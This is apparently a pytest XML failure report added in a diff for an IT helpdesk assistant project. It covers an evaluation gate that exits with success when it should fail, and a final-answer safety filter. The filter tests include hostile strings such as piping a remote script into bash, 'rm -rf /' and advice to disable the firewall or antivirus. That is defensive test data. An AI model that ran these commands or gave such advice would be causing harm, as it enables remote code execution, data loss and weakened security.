+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...rrect": 0, "priority_correct": 1, "retrieval_size": 1, "hit_at_4": 1.0, "mrr": 1.0, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:96: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_invalid_or_missing_input_returns_incomplete[malformed-row]" time="0.260"><failure message="AssertionError: Traceback (most recent call last):&#10;    File &quot;&lt;string&gt;&quot;, line 20, in &lt;module&gt;&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 195, in run&#10;      return runner.run(main)&#10;             ^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 118, in run&#10;      return self._loop.run_until_complete(task)&#10;             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py&quot;, line 691, in run_until_complete&#10;      return future.result()&#10;             ^^^^^^^^^^^^^^^&#10;    File &quot;/private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr3q/baseline-replica/scripts/evaluate.py&quot;, line 18, in main&#10;      for text, intent, priority in cases[&quot;classification&quot;]:&#10;          ^^^^^^^^^^^^^^^^^^^^^^&#10;  ValueError: not enough values to unpack (expected 3, got 2)&#10;  &#10;assert 1 == 2&#10; +  where 1 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ses[&quot;classification&quot;]:\n        ^^^^^^^^^^^^^^^^^^^^^^\nValueError: not enough values to unpack (expected 3, got 2)\n').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_invalid_or_missing_input_4')
+cases = {'classification': [['hello', 'FAQ']], 'retrieval': [['VPN', 'connectivity.md']]}
+
+    @pytest.mark.parametrize("cases", [
+        None, "not-json", {"classification": [], "retrieval": []},
+        {"classification": [["hello", "INVALID", "P3"]], "retrieval": [["VPN", "connectivity.md"]]},
+        {"classification": [["hello", "FAQ"]], "retrieval": [["VPN", "connectivity.md"]]},
+    ], ids=["missing-file", "bad-json", "empty-dataset", "invalid-label", "malformed-row"])
+    def test_invalid_or_missing_input_returns_incomplete(tmp_path, cases):
+        process, report = run_evaluator(tmp_path, cases)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: Traceback (most recent call last):
+E           File "&lt;string&gt;", line 20, in &lt;module&gt;
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 195, in run
+E             return runner.run(main)
+E                    ^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 118, in run
+E             return self._loop.run_until_complete(task)
+E                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py", line 691, in run_until_complete
+E             return future.result()
+E                    ^^^^^^^^^^^^^^^
+E           File "/private&lt;REPO&gt;/scripts/evaluate.py", line 18, in main
+E             for text, intent, priority in cases["classification"]:
+E                 ^^^^^^^^^^^^^^^^^^^^^^
+E         ValueError: not enough values to unpack (expected 3, got 2)
+E         
+E       assert 1 == 2
+E        +  where 1 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ses["classification"]:\n        ^^^^^^^^^^^^^^^^^^^^^^\nValueError: not enough values to unpack (expected 3, got 2)\n').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:96: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_invalid_threshold_cannot_pass[nan-threshold]" time="0.290"><failure message="assert 0 == 2&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ity_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_invalid_threshold_cannot_0')
+args = ('--min-mrr', 'nan')
+
+    @pytest.mark.parametrize("args", [("--min-mrr", "nan"), ("--min-hit-at-4", "1.1")], ids=["nan-threshold", "out-of-range"])
+    def test_invalid_threshold_cannot_pass(tmp_path, args):
+        process, _ = run_evaluator(tmp_path, baseline_cases(), args)
+&gt;       assert process.returncode == 2
+E       assert 0 == 2
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ity_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:104: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_invalid_threshold_cannot_pass[out-of-range]" time="0.290"><failure message="assert 0 == 2&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ity_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_invalid_threshold_cannot_1')
+args = ('--min-hit-at-4', '1.1')
+
+    @pytest.mark.parametrize("args", [("--min-mrr", "nan"), ("--min-hit-at-4", "1.1")], ids=["nan-threshold", "out-of-range"])
+    def test_invalid_threshold_cannot_pass(tmp_path, args):
+        process, _ = run_evaluator(tmp_path, baseline_cases(), args)
+&gt;       assert process.returncode == 2
+E       assert 0 == 2
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ity_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:104: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_cannot_complete_evaluation_is_not_a_pass[bad-config]" time="0.231"><failure message="AssertionError: Traceback (most recent call last):&#10;    File &quot;&lt;string&gt;&quot;, line 20, in &lt;module&gt;&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 195, in run&#10;      return runner.run(main)&#10;             ^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 118, in run&#10;      return self._loop.run_until_complete(task)&#10;             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py&quot;, line 691, in run_until_complete&#10;      return future.result()&#10;             ^^^^^^^^^^^^^^^&#10;    File &quot;/private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr3q/baseline-replica/scripts/evaluate.py&quot;, line 22, in main&#10;      config = Configuration()&#10;               ^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/Desktop/OpsDesk/.venv/lib/python3.12/site-packages/pydantic_settings/main.py&quot;, line 262, in __init__&#10;      super().__init__(**__pydantic_self__.__class__._settings_build_values(sources, init_kwargs))&#10;    File &quot;/Users/shawn/Desktop/OpsDesk/.venv/lib/python3.12/site-packages/pydantic/main.py&quot;, line 263, in __init__&#10;      validated_self = self.__pydantic_validator__.validate_python(data, self_instance=self)&#10;                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;  pydantic_core._pydantic_core.ValidationError: 1 validation error for Configuration&#10;  model_mode&#10;    Input should be 'demo' or 'ollama' [type=literal_error, input_value='invalid-mode', input_type=str]&#10;      For further information visit https://errors.pydantic.dev/2.13/v/literal_error&#10;  &#10;assert 1 == 2&#10; +  where 1 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...invalid-mode\', input_type=str]\n    For further information visit https://errors.pydantic.dev/2.13/v/literal_error\n').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_cannot_complete_evaluatio0')
+config = {'OPSDESK_MODEL_MODE': 'invalid-mode'}, fault = None
+
+    @pytest.mark.parametrize("config,fault", [
+        ({"OPSDESK_MODEL_MODE": "invalid-mode"}, None),
+        ({"OPSDESK_KNOWLEDGE_DIRECTORY": "missing-knowledge"}, None),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-unavailable"),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-degraded"),
+        ({}, "query-failure"),
+    ], ids=["bad-config", "missing-corpus", "required-vectors-unavailable", "hybrid-degraded-to-bm25", "retrieval-exception"])
+    def test_cannot_complete_evaluation_is_not_a_pass(tmp_path, config, fault):
+        process, report = run_evaluator(tmp_path, baseline_cases(), config=config, fault=fault)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: Traceback (most recent call last):
+E           File "&lt;string&gt;", line 20, in &lt;module&gt;
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 195, in run
+E             return runner.run(main)
+E                    ^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 118, in run
+E             return self._loop.run_until_complete(task)
+E                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py", line 691, in run_until_complete
+E             return future.result()
+E                    ^^^^^^^^^^^^^^^
+E           File "/private&lt;REPO&gt;/scripts/evaluate.py", line 22, in main
+E             config = Configuration()
+E                      ^^^^^^^^^^^^^^^
+E           File "&lt;REPO&gt;/.venv/lib/python3.12/site-packages/pydantic_settings/main.py", line 262, in __init__
+E             super().__init__(**__pydantic_self__.__class__._settings_build_values(sources, init_kwargs))
+E           File "&lt;REPO&gt;/.venv/lib/python3.12/site-packages/pydantic/main.py", line 263, in __init__
+E             validated_self = self.__pydantic_validator__.validate_python(data, self_instance=self)
+E                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E         pydantic_core._pydantic_core.ValidationError: 1 validation error for Configuration
+E         model_mode
+E           Input should be 'demo' or 'ollama' [type=literal_error, input_value='invalid-mode', input_type=str]
+E             For further information visit https://errors.pydantic.dev/2.13/v/literal_error
+E         
+E       assert 1 == 2
+E        +  where 1 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...invalid-mode\', input_type=str]\n    For further information visit https://errors.pydantic.dev/2.13/v/literal_error\n').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:116: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_cannot_complete_evaluation_is_not_a_pass[missing-corpus]" time="0.246"><failure message="AssertionError: {&quot;at&quot;: &quot;2026-10-12T15:21:35.701350+00:00&quot;, &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: 24, &quot;intent_correct&quot;: 24, &quot;priority_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 0.0, &quot;mrr&quot;: 0.0, &quot;vector_queries&quot;: 0}&#10;  &#10;assert 0 == 2&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ct&quot;: 24, &quot;priority_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 0.0, &quot;mrr&quot;: 0.0, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_cannot_complete_evaluatio1')
+config = {'OPSDESK_KNOWLEDGE_DIRECTORY': 'missing-knowledge'}, fault = None
+
+    @pytest.mark.parametrize("config,fault", [
+        ({"OPSDESK_MODEL_MODE": "invalid-mode"}, None),
+        ({"OPSDESK_KNOWLEDGE_DIRECTORY": "missing-knowledge"}, None),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-unavailable"),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-degraded"),
+        ({}, "query-failure"),
+    ], ids=["bad-config", "missing-corpus", "required-vectors-unavailable", "hybrid-degraded-to-bm25", "retrieval-exception"])
+    def test_cannot_complete_evaluation_is_not_a_pass(tmp_path, config, fault):
+        process, report = run_evaluator(tmp_path, baseline_cases(), config=config, fault=fault)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: {"at": "2026-10-12T15:21:35.701350+00:00", "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": 24, "intent_correct": 24, "priority_correct": 24, "retrieval_size": 12, "hit_at_4": 0.0, "mrr": 0.0, "vector_queries": 0}
+E         
+E       assert 0 == 2
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ct": 24, "priority_correct": 24, "retrieval_size": 12, "hit_at_4": 0.0, "mrr": 0.0, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:116: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_cannot_complete_evaluation_is_not_a_pass[required-vectors-unavailable]" time="0.281"><failure message="AssertionError: {&quot;at&quot;: &quot;2026-10-12T15:21:35.979330+00:00&quot;, &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: 24, &quot;intent_correct&quot;: 24, &quot;priority_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}&#10;  &#10;assert 0 == 2&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ity_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_cannot_complete_evaluatio2')
+config = {'OPSDESK_VECTOR_SEARCH': 'true'}, fault = 'vector-unavailable'
+
+    @pytest.mark.parametrize("config,fault", [
+        ({"OPSDESK_MODEL_MODE": "invalid-mode"}, None),
+        ({"OPSDESK_KNOWLEDGE_DIRECTORY": "missing-knowledge"}, None),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-unavailable"),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-degraded"),
+        ({}, "query-failure"),
+    ], ids=["bad-config", "missing-corpus", "required-vectors-unavailable", "hybrid-degraded-to-bm25", "retrieval-exception"])
+    def test_cannot_complete_evaluation_is_not_a_pass(tmp_path, config, fault):
+        process, report = run_evaluator(tmp_path, baseline_cases(), config=config, fault=fault)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: {"at": "2026-10-12T15:21:35.979330+00:00", "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": 24, "intent_correct": 24, "priority_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}
+E         
+E       assert 0 == 2
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ity_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:116: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_cannot_complete_evaluation_is_not_a_pass[hybrid-degraded-to-bm25]" time="0.366"><failure message="AssertionError: {&quot;at&quot;: &quot;2026-10-12T15:21:36.350896+00:00&quot;, &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: 24, &quot;intent_correct&quot;: 24, &quot;priority_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}&#10;  &#10;assert 0 == 2&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ity_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_cannot_complete_evaluatio3')
+config = {'OPSDESK_VECTOR_SEARCH': 'true'}, fault = 'vector-degraded'
+
+    @pytest.mark.parametrize("config,fault", [
+        ({"OPSDESK_MODEL_MODE": "invalid-mode"}, None),
+        ({"OPSDESK_KNOWLEDGE_DIRECTORY": "missing-knowledge"}, None),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-unavailable"),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-degraded"),
+        ({}, "query-failure"),
+    ], ids=["bad-config", "missing-corpus", "required-vectors-unavailable", "hybrid-degraded-to-bm25", "retrieval-exception"])
+    def test_cannot_complete_evaluation_is_not_a_pass(tmp_path, config, fault):
+        process, report = run_evaluator(tmp_path, baseline_cases(), config=config, fault=fault)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: {"at": "2026-10-12T15:21:36.350896+00:00", "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": 24, "intent_correct": 24, "priority_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}
+E         
+E       assert 0 == 2
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ity_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:116: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_cannot_complete_evaluation_is_not_a_pass[retrieval-exception]" time="0.271"><failure message="AssertionError: Traceback (most recent call last):&#10;    File &quot;&lt;string&gt;&quot;, line 20, in &lt;module&gt;&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 195, in run&#10;      return runner.run(main)&#10;             ^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py&quot;, line 118, in run&#10;      return self._loop.run_until_complete(task)&#10;             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py&quot;, line 691, in run_until_complete&#10;      return future.result()&#10;             ^^^^^^^^^^^^^^^&#10;    File &quot;/private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr3q/baseline-replica/scripts/evaluate.py&quot;, line 30, in main&#10;      results = await knowledge.search(query)&#10;                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^&#10;    File &quot;&lt;string&gt;&quot;, line 18, in broken&#10;  RuntimeError: Synthetic retrieval failure&#10;  &#10;assert 1 == 2&#10; +  where 1 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File &quot;&lt;string&gt;&quot;, line 18, in broken\nRuntimeError: Synthetic retrieval failure\n').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_cannot_complete_evaluatio4')
+config = {}, fault = 'query-failure'
+
+    @pytest.mark.parametrize("config,fault", [
+        ({"OPSDESK_MODEL_MODE": "invalid-mode"}, None),
+        ({"OPSDESK_KNOWLEDGE_DIRECTORY": "missing-knowledge"}, None),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-unavailable"),
+        ({"OPSDESK_VECTOR_SEARCH": "true"}, "vector-degraded"),
+        ({}, "query-failure"),
+    ], ids=["bad-config", "missing-corpus", "required-vectors-unavailable", "hybrid-degraded-to-bm25", "retrieval-exception"])
+    def test_cannot_complete_evaluation_is_not_a_pass(tmp_path, config, fault):
+        process, report = run_evaluator(tmp_path, baseline_cases(), config=config, fault=fault)
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: Traceback (most recent call last):
+E           File "&lt;string&gt;", line 20, in &lt;module&gt;
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 195, in run
+E             return runner.run(main)
+E                    ^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py", line 118, in run
+E             return self._loop.run_until_complete(task)
+E                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py", line 691, in run_until_complete
+E             return future.result()
+E                    ^^^^^^^^^^^^^^^
+E           File "/private&lt;REPO&gt;/scripts/evaluate.py", line 30, in main
+E             results = await knowledge.search(query)
+E                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+E           File "&lt;string&gt;", line 18, in broken
+E         RuntimeError: Synthetic retrieval failure
+E         
+E       assert 1 == 2
+E        +  where 1 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File "&lt;string&gt;", line 18, in broken\nRuntimeError: Synthetic retrieval failure\n').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:116: AssertionError</failure></testcase><testcase classname="tests.qa.test_evaluation_gate" name="test_report_write_failure_cannot_return_success" time="0.274"><failure message="AssertionError: {&quot;at&quot;: &quot;2026-10-12T15:21:36.906261+00:00&quot;, &quot;scope&quot;: &quot;Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.&quot;, &quot;classification_size&quot;: 24, &quot;intent_correct&quot;: 24, &quot;priority_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}&#10;  &#10;assert 0 == 2&#10; +  where 0 = CompletedProcess(args=['/Users/shawn/Desktop/OpsDesk/.venv/bin/python', '-c', &quot;\nimport asyncio, runpy, sys\nfrom path...ity_correct&quot;: 24, &quot;retrieval_size&quot;: 12, &quot;hit_at_4&quot;: 1.0, &quot;mrr&quot;: 0.9444444444444445, &quot;vector_queries&quot;: 0}\n', stderr='').returncode">tmp_path = PosixPath('/private&lt;TEMP&gt;/pytest/test_report_write_failure_cann0')
+
+    def test_report_write_failure_cannot_return_success(tmp_path):
+        blocked_output = tmp_path / "output-is-a-directory"
+        blocked_output.mkdir()
+        process, report = run_evaluator(tmp_path, baseline_cases(), args=("--output", str(blocked_output)))
+&gt;       assert process.returncode == 2, process.stdout + process.stderr
+E       AssertionError: {"at": "2026-10-12T15:21:36.906261+00:00", "scope": "Small self-authored synthetic regression set. Classification tests the deterministic fallback only, not model accuracy. Retrieval reflects the explicitly recorded runtime channels. No held-out or production claim.", "classification_size": 24, "intent_correct": 24, "priority_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}
+E         
+E       assert 0 == 2
+E        +  where 0 = CompletedProcess(args=['&lt;REPO&gt;/.venv/bin/python', '-c', "\nimport asyncio, runpy, sys\nfrom path...ity_correct": 24, "retrieval_size": 12, "hit_at_4": 1.0, "mrr": 0.9444444444444445, "vector_queries": 0}\n', stderr='').returncode
+
+&lt;REPO&gt;/tests/qa/test_evaluation_gate.py:125: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_safe_and_negated_advice_is_allowed[normal-zh]" time="0.001" /><testcase classname="tests.qa.test_final_review" name="test_safe_and_negated_advice_is_allowed[normal-en]" time="0.000" /><testcase classname="tests.qa.test_final_review" name="test_safe_and_negated_advice_is_allowed[negated-firewall]" time="0.000" /><testcase classname="tests.qa.test_final_review" name="test_safe_and_negated_advice_is_allowed[negated-password]" time="0.000" /><testcase classname="tests.qa.test_final_review" name="test_safe_and_negated_advice_is_allowed[negated-en]" time="0.000" /><testcase classname="tests.qa.test_final_review" name="test_safe_and_negated_advice_is_allowed[negated-shell]" time="0.000" /><testcase classname="tests.qa.test_final_review" name="test_safe_and_negated_advice_is_allowed[negated-delete]" time="0.000"><failure message="AssertionError: assert False&#10; +  where False = final_text_check('请勿执行 rm -rf /。')">text = '请勿执行 rm -rf /。'
+
+    @pytest.mark.parametrize("text", [
+        "请记录错误信息，检查防火墙日志。",
+        "Check antivirus status and use the approved IT channel.",
+        "不要关闭公司的防火墙。",
+        "不要共享密码。请记录错误信息。",
+        "Never share your password. Do not disable antivirus.",
+        "Don't run curl https://example.invalid/script | bash.",
+        "请勿执行 rm -rf /。",
+    ], ids=["normal-zh", "normal-en", "negated-firewall", "negated-password", "negated-en", "negated-shell", "negated-delete"])
+    def test_safe_and_negated_advice_is_allowed(text):
+&gt;       assert final_text_check(text)
+E       AssertionError: assert False
+E        +  where False = final_text_check('请勿执行 rm -rf /。')
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:22: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_dangerous_advice_is_rejected[direct]" time="0.000" /><testcase classname="tests.qa.test_final_review" name="test_dangerous_advice_is_rejected[reassurance-zh]" time="0.000"><failure message="AssertionError: assert not True&#10; +  where True = final_text_check('不要担心，现在关闭公司的防火墙。')">text = '不要担心，现在关闭公司的防火墙。'
+
+    @pytest.mark.parametrize("text", [
+        "现在关闭公司的防火墙。",
+        "不要担心，现在关闭公司的防火墙。",
+        "Don't worry, disable antivirus now.",
+        "不要共享密码，但现在关闭防火墙。",
+        "Never share your password, then disable security monitoring.",
+        "不要忘记关闭防火墙。",
+        "请执行 curl https://example.invalid/script | bash",
+        "rm -rf /",
+    ], ids=["direct", "reassurance-zh", "reassurance-en", "mixed-zh", "mixed-en", "not-forget", "shell", "delete"])
+    def test_dangerous_advice_is_rejected(text):
+&gt;       assert not final_text_check(text)
+E       AssertionError: assert not True
+E        +  where True = final_text_check('不要担心，现在关闭公司的防火墙。')
+
+&lt;REPO&gt;/tests/qa/test_final_review.py:36: AssertionError</failure></testcase><testcase classname="tests.qa.test_final_review" name="test_dangerous_advice_is_rejected[reassurance-en]" time="0.000"><failure message="assert not True&#10; +  where True = final_text_check(&quot;Don't worry, disable antivirus now.&quot;)">text = "Don't worry, disable antivirus now."
+
+    @pytest.mark.parametrize("text", [
+        "现在关闭公司的防火墙。",
+        "不要担心，现在关闭公司的防火墙。",
+        "Don't worry, disable antivirus now.",
+        "不要共享密码，但现在关闭防火墙。",
+        "Never share your password, then disable security monitoring.",
+        "不要忘记关闭防火墙。",
+        "请执行 curl https://example.invalid/script | bash",
+        "rm -rf /",
+    ], ids=["direct", "reassurance-zh", "reassurance-en", "mixed-zh", "mixed-en", "not-forget", "shell", "delete"])
+    def test_dangerous_advice_is_rejected(text):
+&gt;       assert not final_text_check(text)
+E       assert not True
+E        +  where True = final_text_check("Don't worry, disable antivirus now.")
